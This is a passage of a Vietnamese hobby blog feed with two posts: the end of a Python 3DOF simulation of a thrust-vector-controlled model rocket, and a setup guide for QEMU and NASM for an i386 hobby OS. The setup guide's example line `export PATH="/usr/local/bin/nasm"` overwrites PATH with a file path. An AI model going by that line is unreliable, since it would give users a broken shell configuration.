<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">Fx</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sin</span>(<span style="color:#e06c75">gimbal_angle</span>) <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_profile</span> <span style="color:#7f848e"># lực ngang</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">Fz</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">cos</span>(<span style="color:#e06c75">gimbal_angle</span>) <span style="color:#56b6c2">*</span> <span style="color:#e06c75">thrust_profile</span> <span style="color:#7f848e"># lực dọc</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">My</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fx</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">moment_arm</span> <span style="color:#7f848e"># mô men pitch (mô men xoắn)</span>
</span></span></code></pre></div><p>Mình sử dụng 1 vài phương trình lượng giác để tính lực đẩy của tên lửa trên 2 trục. Đây là cách tính của mình:</p>

    <img src="/img/tvc-modeling/fx-fz-trig.png"  alt="Forces and thrust trigonometry visualization"  class="center"  style="padding: 10px"  />


<p>Đây là cách mà lực $F_x$ và $F_z$ được áp đặt lên tên lửa, với $\theta$ là góc gimbal. Chúng ta có thể thấy được với tam giác vuông này thì chúng ta có thể áp dụng những phương trình lượng giác để tính được $F_x$ và $F_z$:</p>
<p>$$
\sin(\theta) = \frac{F_x}{T}, \ \cos(\theta) = \frac{F_z}{T}
$$</p>
<p>Sắp xếp lại 2 phương trình này sẽ cho ra 2 phương trình dùng để tính $F_x$ và $F_z$:</p>
<p>$$
F_x = \sin(\theta) * T, \ F_z = \cos(\theta) * T
$$</p>
<p>Với mô men xoắn thì chúng ta có thể nhân lực $F_x$ với giá trị cánh tay đòn bởi vì lực đẩy ngang sẽ tạo ra mô men quanh trọng tâm của tên lửa (nó được dùng để điều khiển pitch, thế nên nó được gọi là mô men pitch).</p>
<p>Đây là tất cả các giá trị mà chúng ta cần để cho vào hàm 3DOF:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">results</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">three_dof_body_axes</span>(<span style="color:#e06c75">Fx</span>, <span style="color:#e06c75">Fz</span>, <span style="color:#e06c75">My</span>, <span style="color:#e06c75">u0</span>, <span style="color:#e06c75">w0</span>, <span style="color:#e06c75">theta0</span>, <span style="color:#e06c75">q0</span>, <span style="color:#e06c75">pos0</span>, <span style="color:#e06c75">mass</span>, <span style="color:#e06c75">inertia</span>, <span style="color:#e06c75">g</span>, <span style="color:#e06c75">dt</span>, <span style="color:#e06c75">simulation_duration</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">time</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">arange</span>(<span style="color:#d19a66">0</span>, <span style="color:#e5c07b">len</span>(<span style="color:#e06c75">results</span>[<span style="color:#98c379">&#39;pos&#39;</span>]) <span style="color:#56b6c2">*</span> <span style="color:#e06c75">dt</span>, <span style="color:#e06c75">dt</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">pos</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">results</span>[<span style="color:#98c379">&#39;pos&#39;</span>]
</span></span><span style="display:flex;"><span><span style="color:#e06c75">velocity</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">results</span>[<span style="color:#98c379">&#39;velocity&#39;</span>]
</span></span><span style="display:flex;"><span><span style="color:#e06c75">acceleration</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">results</span>[<span style="color:#98c379">&#39;acceleration&#39;</span>]
</span></span></code></pre></div><h3 id="vẽ-lược-đồ-dữ-liệu-mô-phỏng-góc-gimbal--0">Vẽ lược đồ dữ liệu mô phỏng (góc gimbal = 0)</h3>
<p>Mình sẽ vẽ lược đồ cho các giá trị về trạng thái của tên lửa vừa được tính toán:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># vẽ lược đồ (dữ liệu trục Z)</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">figure</span>(<span style="color:#e06c75">figsize</span><span style="color:#56b6c2">=</span>(<span style="color:#d19a66">12</span>, <span style="color:#d19a66">8</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">subplot</span>(<span style="color:#d19a66">3</span>, <span style="color:#d19a66">1</span>, <span style="color:#d19a66">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">plot</span>(<span style="color:#e06c75">time</span>, <span style="color:#e06c75">pos</span>[:, <span style="color:#d19a66">1</span>], <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;Z Position&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">xlabel</span>(<span style="color:#98c379">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ylabel</span>(<span style="color:#98c379">&#39;Z Position (m)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">title</span>(<span style="color:#98c379">&#39;Z Position Data&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">legend</span>()
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">grid</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">subplot</span>(<span style="color:#d19a66">3</span>, <span style="color:#d19a66">1</span>, <span style="color:#d19a66">2</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">plot</span>(<span style="color:#e06c75">time</span>, <span style="color:#e06c75">velocity</span>[:, <span style="color:#d19a66">1</span>], <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;Z Velocity&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">xlabel</span>(<span style="color:#98c379">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ylabel</span>(<span style="color:#98c379">&#39;Z Velocity (m/s)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">title</span>(<span style="color:#98c379">&#39;Z Velocity Data&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">legend</span>()
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">grid</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">subplot</span>(<span style="color:#d19a66">3</span>, <span style="color:#d19a66">1</span>, <span style="color:#d19a66">3</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">plot</span>(<span style="color:#e06c75">time</span>, <span style="color:#e06c75">acceleration</span>[:, <span style="color:#d19a66">1</span>], <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;Z Acceleration&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">xlabel</span>(<span style="color:#98c379">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ylabel</span>(<span style="color:#98c379">&#39;Z Acceleration (m/s^2)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">title</span>(<span style="color:#98c379">&#39;Z Acceleration Data&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">legend</span>()
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">grid</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">tight_layout</span>()
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">show</span>()
</span></span></code></pre></div>
    <img src="/img/tvc-modeling/z-data-plot-1.png"  alt="Z data plots 1"  class="center"  style="padding: 10px"  />


<p>Chúng ta có thể thấy là tên lửa này có thể đạt độ cao khoảng hơn $100m$ với vận tốc tối đa là khoảng $30m/s$. Gia tốc của tên lửa bắt đầu ở khoảng $-9.81m/s^2$ bởi vì tên lửa bị kéo xuống bởi trọng lực. Vào khoảng vài mili giây sau khi phóng thì gia tốc đạt $0m/s^2$, có nghĩa là lực đẩy của tên lửa đã hóa với lực kéo của trọng lực. Vào khoảng vài mili giây sau đó thì nó đạt được gia tốc khoảng $15m/s^2$, rồi nó dần giảm xuống do tên lửa đã vào giai đoạn giảm tốc.</p>
<p>Mình sẽ vẽ lược đồ cho dữ liệu ở trục X:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># vẽ lược đồ (dữ liệu trục X)</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">figure</span>(<span style="color:#e06c75">figsize</span><span style="color:#56b6c2">=</span>(<span style="color:#d19a66">12</span>, <span style="color:#d19a66">8</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">subplot</span>(<span style="color:#d19a66">3</span>, <span style="color:#d19a66">1</span>, <span style="color:#d19a66">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">plot</span>(<span style="color:#e06c75">time</span>, <span style="color:#e06c75">pos</span>[:, <span style="color:#d19a66">0</span>], <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;X Position&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">xlabel</span>(<span style="color:#98c379">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ylabel</span>(<span style="color:#98c379">&#39;X Position (m)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">title</span>(<span style="color:#98c379">&#39;X Position Data&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">legend</span>()
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">grid</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">subplot</span>(<span style="color:#d19a66">3</span>, <span style="color:#d19a66">1</span>, <span style="color:#d19a66">2</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">plot</span>(<span style="color:#e06c75">time</span>, <span style="color:#e06c75">velocity</span>[:, <span style="color:#d19a66">0</span>], <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;X Velocity&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">xlabel</span>(<span style="color:#98c379">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ylabel</span>(<span style="color:#98c379">&#39;X Velocity (m/s)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">title</span>(<span style="color:#98c379">&#39;X Velocity Data&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">legend</span>()
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">grid</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">subplot</span>(<span style="color:#d19a66">3</span>, <span style="color:#d19a66">1</span>, <span style="color:#d19a66">3</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">plot</span>(<span style="color:#e06c75">time</span>, <span style="color:#e06c75">acceleration</span>[:, <span style="color:#d19a66">0</span>], <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;X Acceleration&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">xlabel</span>(<span style="color:#98c379">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ylabel</span>(<span style="color:#98c379">&#39;X Acceleration (m/s^2)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">title</span>(<span style="color:#98c379">&#39;X Acceleration Data&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">legend</span>()
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">grid</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">tight_layout</span>()
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">show</span>()
</span></span></code></pre></div>
    <img src="/img/tvc-modeling/x-data-plot-1.png"  alt="X data plots 1"  class="center"  style="padding: 10px"  />


<p>Bởi vì mình đã đặt biến <code>gimbal_angle</code> về $0rad$, tên lửa này sẽ phóng thẳng lên, không di chuyển 1 ít nào ở trục X.</p>
<p>Mình sẽ vẽ lược đồ miêu tả quỹ đạo bay của tên lửa để xem tên lửa này sẽ bay thế nào:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># plot trajectory of rocket (2D) lược đồ quy đạo bay của tên lửa (2D)</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">figure</span>(<span style="color:#e06c75">figsize</span><span style="color:#56b6c2">=</span>(<span style="color:#d19a66">8</span>, <span style="color:#d19a66">5</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">plot</span>(<span style="color:#e06c75">pos</span>[:, <span style="color:#d19a66">0</span>], <span style="color:#e06c75">pos</span>[:, <span style="color:#d19a66">1</span>], <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;Rocket Trajectory&#39;</span>, <span style="color:#e06c75">color</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;blue&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">scatter</span>(<span style="color:#e06c75">pos</span>[<span style="color:#d19a66">0</span>, <span style="color:#d19a66">0</span>], <span style="color:#e06c75">pos</span>[<span style="color:#d19a66">0</span>, <span style="color:#d19a66">1</span>], <span style="color:#e06c75">color</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;green&#39;</span>, <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;Launch Point&#39;</span>) <span style="color:#7f848e"># điểm xuất phát</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">scatter</span>(<span style="color:#e06c75">pos</span>[<span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>, <span style="color:#d19a66">0</span>], <span style="color:#e06c75">pos</span>[<span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>, <span style="color:#d19a66">1</span>], <span style="color:#e06c75">color</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;red&#39;</span>, <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;Impact Point&#39;</span>) <span style="color:#7f848e"># điểm dừng</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">axhline</span>(<span style="color:#d19a66">0</span>, <span style="color:#e06c75">color</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;black&#39;</span>, <span style="color:#e06c75">linestyle</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;--&#39;</span>, <span style="color:#e06c75">label</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;Ground&#39;</span>) <span style="color:#7f848e"># mặt đất</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">xlabel</span>(<span style="color:#98c379">&#39;X Position (m)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ylabel</span>(<span style="color:#98c379">&#39;Z Position (m)&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">title</span>(<span style="color:#98c379">&#39;Rocket Trajectory&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">legend</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">show</span>()
</span></span></code></pre></div>
    <img src="/img/tvc-modeling/rocket-trajectory-1.png"  alt="Rocket trajectory plot 1"  class="center"  style="padding: 10px"  />


<p>Tên lửa này sẽ phóng thẳng lên khoảng hơn $100m$ 1 ít rồi rơi thẳng xuống.</p>
<h3 id="vẽ-lược-đồ-dữ-liệu-mô-phỏng-góc-gimbal-khác-0">Vẽ lược đồ dữ liệu mô phỏng (góc gimbal khác 0)</h3>
<p>Mình sẽ điều chính góc gimbal để xem tên lửa này sẽ bay thế nào:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">gimbal_angle</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">0.05</span> <span style="color:#7f848e"># radian</span>
</span></span></code></pre></div><p>Và mình sẽ chạy lại chương trình và lấy dữ liệu đầu ra.</p>
<ul>
<li>Dữ liệu trục Z:</li>
</ul>

    <img src="/img/tvc-modeling/z-data-plot-2.png"  alt="Z data plots 2"  class="center"  style="padding: 10px"  />


<ul>
<li>Dữ liệu trục X:</li>
</ul>

    <img src="/img/tvc-modeling/x-data-plot-2.png"  alt="X data plots 2"  class="center"  style="padding: 10px"  />


<p>Chúng ta có thể thấy là dữ liệu trục Z không thay đổi từ lần mô phỏng trước, nhưng dữ liệu trục X thay đổi rất nhiều. Dữ liệu vị trí trục X dần dần tiến tới 1 giá trị khác. Điều này có nghĩa là tên lửa đang di chuyển trên trục X. Chúng ta cũng có thể thấy là dữ liệu vận tốc đang giảm xuống giá trị âm do chúng ta đang phóng tên lửa sang bên trái.</p>

    <img src="/img/tvc-modeling/rocket-trajectory-2.png"  alt="Rocket trajectory plot 2"  class="center"  style="padding: 10px"  />


<p>Đây là quỹ đạo của tên lửa này. Chúng ta có thể thấy là tên lửa này bay lên hơn $100m$ và hạ cánh tại vị trí cách vị trí bắt đầu khoảng $30m$. Chúng ta đã mô phỏng tên lửa điều chỉnh vectơ đẩy trong Python thành công.</p>
<h2 id="kết-luận">Kết luận</h2>
<p>Chúng ta đã xây dựng 1 chương trình mô phỏng tên lửa điều chỉnh vectơ đẩy trong Python với 3 bậc tự do. Chúng ta cũng đã nói đến 3 bậc tự do là gì, đặc tính lực đẩy là gì, cách lập trình mô phỏng tên lửa và vẽ lược đồ dữ liệu tên lửa và lược đồ quỹ đạo bay của tên lửa.</p>
<p>Dự án này vẫn còn nhiều việc để làm như là lập trình 1 đặc tính lực đẩy giống thực tế hơn, lập trình các yếu tố bên ngoài như là gió hay lực cản không khí, và lập trình 1 bộ điều khiển như là PID để điều khiển tên lửa này. Mình sẽ lập tình các tính năng này vào chương trình mô phỏng này trong tương lai.</p>
<p>Đây là 1 dự án rất hay đối với mình. Mình đã học được thêm rất nhiều thứ về kĩ thuật tên lửa và mình mong rằng bạn cũng đã học thêm được về kĩ thuật tên lửa và động lực tên lửa từ bài đăng blog này.</p>
<blockquote>
<p>Tất cả code trong bài đăng này được host tại <a href="https://github.com/namberino/tvc-sim">đây</a></p></blockquote>
]]></content>
        </item>
        
        <item>
            <title>Lập trình hệ điều hành: Khởi đầu</title>
            <link>https://namberino.github.io/vi/posts/2024/06/l%E1%BA%ADp-tr%C3%ACnh-h%E1%BB%87-%C4%91i%E1%BB%81u-h%C3%A0nh-kh%E1%BB%9Fi-%C4%91%E1%BA%A7u/</link>
            <pubDate>Tue, 04 Jun 2024 22:12:15 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2024/06/l%E1%BA%ADp-tr%C3%ACnh-h%E1%BB%87-%C4%91i%E1%BB%81u-h%C3%A0nh-kh%E1%BB%9Fi-%C4%91%E1%BA%A7u/</guid>
            <description>&lt;p&gt;Mình vừa học xong 1 môn về hệ điều hành vài kì học trước nhưng môn đó có rất nhiều lý thuyết và gần như không thực hành về hệ điều hành. Sau khi học xong môn đó thì mình không cảm thấy mình thực sử hiểu về cách hoạt động của hệ điều hành. Thế nên mình quyết định là sẽ tự tạo ra 1 hệ điều hành của riêng mình để có thể lấy kinh nghiệm thực tế về hệ điều hành và tăng vốn hiểu biết của mình về hệ điều hành.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Mình vừa học xong 1 môn về hệ điều hành vài kì học trước nhưng môn đó có rất nhiều lý thuyết và gần như không thực hành về hệ điều hành. Sau khi học xong môn đó thì mình không cảm thấy mình thực sử hiểu về cách hoạt động của hệ điều hành. Thế nên mình quyết định là sẽ tự tạo ra 1 hệ điều hành của riêng mình để có thể lấy kinh nghiệm thực tế về hệ điều hành và tăng vốn hiểu biết của mình về hệ điều hành.</p>
<p>Mình sẽ chia sẻ chi tiết về dự án này trên blog này. Mình sẽ cố gắng hết khả năng của mình để giải thích mọi thứ 1 cách chi tiết để những ai mà muốn đi theo con đường này có thể học hỏi từ đây và xây dựng nền tảng nhanh hơn.</p>
<p>Bài đăng này sẽ đi vào cách thiết lập 1 môi trường lập trình với các công cụ cần thiết đề làm cái hệ điều hành này.</p>
<h2 id="chọn-cấu-trúc-vi-xử-lý">Chọn cấu trúc vi xử lý</h2>
<p>Một hệ điều hành cần được lập trình để chạy trên 1 cấu trúc vi xử lý nhất định. Bạn có thể thấy là các hệ điều hành hiện đại đều được lập trình để có thể chạy trên được nhiều cấu trúc vi xử lý khác nhau. Ví dụ như Linux, bạn có thể mình trong <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch?h=v6.10-rc2">mã nguồn</a> của nó và thấy được tất cả các cấu trúc khác nhau mà nó hỗ trợ.</p>
<p>Chúng ta sẽ không thể lập trình 1 hệ điều hành mà có thể chạy trên được nhiều cấu trúc vi xử lý khác nhau bởi vì việc đó khá phức tạp. Thế nên mình sẽ chọn <strong>một</strong> cấu trúc vi xử lý và xây dựng hệ điều hành cho cấu trúc đó.</p>
<p>Mình đã chọn cấu trúc <em>x86</em> bởi vì cấu trúc này rất nổi tiếng và có rất nhiều tài liệu và hướng dẫn cho lập trình trên cấu trúc <em>x86</em> này. Điều này sẽ làm cho việc lập trình cho cấu trúc này dễ hơn. Mình sẽ lập trình cho cụ thể là gia đình vi xử lý <em>i386</em>. Gia đình vi xử lý này cũng khá cũ, chúng có nhiều tài liệu và chúng cũng không quá phức tạp.</p>
<h2 id="công-cụ">Công cụ</h2>
<p>Giờ thì chúng ta sẽ bắt đầu cài công cụ và set up môi trường làm việc. Đầu tiên thì chúng ta se dùng một hệ điều hành dựa trên <em>Unix</em> bởi vì thường thì chúng sẽ có các công cụ chúng ta sẽ dùng hoặc chúng sẽ có cách để cài các công cụ đó 1 cách dễ dàng. Mình sẽ dùng Mac nhưng mà mình nghĩ Linux sẽ tốt hơn cho việc này bởi vì thường thì nó có các công cụ này sẵn rồi.</p>
<p>Chúng ta sẽ cài 2 công cụ: <a href="https://www.qemu.org/"><em>QEMU</em></a> và <a href="https://nasm.us/"><em>NASM</em></a></p>
<ul>
<li><em>QEMU</em> là 1 chương trình giả lập. Nó cho phép chúng ta giả lập vi xử lý mà chúng ta đã chọn và chạy chương trình được lập trình cho cấu trúc đó. Bởi vì <em>i386</em> không được sản xuất nữa, chúng ta sẽ dùng giả lập này để chạy hệ điều hành.</li>
<li><em>NASM</em> là 1 chương trình dịch assembly. Nó cho phép chúng ta dịch chương trình assembly xuống file nhị phân có thể chạy được trên cấu trúc <em>i386</em>. File nhị phân này sẽ được upload lên <em>QEMU</em> để chạy.</li>
</ul>
<h2 id="set-up-môi-trường">Set up môi trường</h2>
<p>Với Mac, chúng ta sẽ cần <a href="https://brew.sh/">cài Homebrew</a> và chạy câu lệnh này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>brew install qemu nasm
</span></span></code></pre></div><p>Với Linux (Họ Debian), chạy câu lệnh này nếu như bạn chưa có QEMU hay NASM:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo apt install qemu nasm
</span></span></code></pre></div><p>Nếu như bạn không dùng được công cụ thì bạn sẽ cần update cái biến PATH trong file <code>.bashrc</code> (hoặc <code>.zshrc</code> nếu như bạn dùng zsh) với đường dẫn tới các công cụ này. Đây là 1 ví dụ cho cách update biến PATH:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#7f848e"># trong .zshrc</span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">export</span> <span style="color:#e06c75">PATH</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;/usr/local/bin/nasm&#34;</span>
</span></span></code></pre></div><p>Với Windows thì mình cũng không rõ cách set up thế nào bởi vì mình không có máy nào chạy Windows. Nhưng mình nghĩ cài QEMU và NASM trên Windows vẫn được, bạn chỉ cần đảm bảo là bạn có thể dùng được các công cụ đó trên terminal.</p>
<h2 id="kết-luận">Kết luận</h2>
<p>Đó là cách set up môi trường làm việc cho dự án hệ điều hành này. Nếu như mình dùng thêm các công cụ khác thì mình sẽ nói về cách set up các công cụ đó sau. Hiện tại thì đây là các công cụ cần thiết đề làm dự án này.</p>
